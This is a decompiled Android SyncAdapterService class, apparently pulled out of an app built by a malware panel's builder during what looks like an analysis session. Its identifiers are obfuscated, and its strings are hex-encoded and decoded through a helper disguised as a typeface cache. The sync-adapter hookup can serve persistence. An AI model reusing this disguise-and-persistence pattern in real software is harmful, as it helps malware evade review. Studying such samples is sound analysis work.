package app.mobilex.plus.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import app.mobilex.plus.util.TypefaceCache;
import v.s.kJ8FgakwE9SARC1IGv6E;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class SyncAdapterService extends Service {
    public static final String w9sT1Swbhx3hs;
    public kJ8FgakwE9SARC1IGv6E dDIMxZXP1V8HdM;

    static {
        TypefaceCache.obtain("0010006F0055008400D100BB00D300B700370073004900B400E600BC");
        w9sT1Swbhx3hs = TypefaceCache.obtain("0010006F0048009300F500B2");
    }

    private static /* synthetic */ void hcwscj() {
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        kJ8FgakwE9SARC1IGv6E kj8fgakwe9sarc1igv6e = this.dDIMxZXP1V8HdM;
        if (kj8fgakwe9sarc1igv6e != null) {
            return kj8fgakwe9sarc1igv6e.getSyncAdapterBinder();
        }
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        this.dDIMxZXP1V8HdM = new kJ8FgakwE9SARC1IGv6E(getApplicationContext(), true);
    }
}
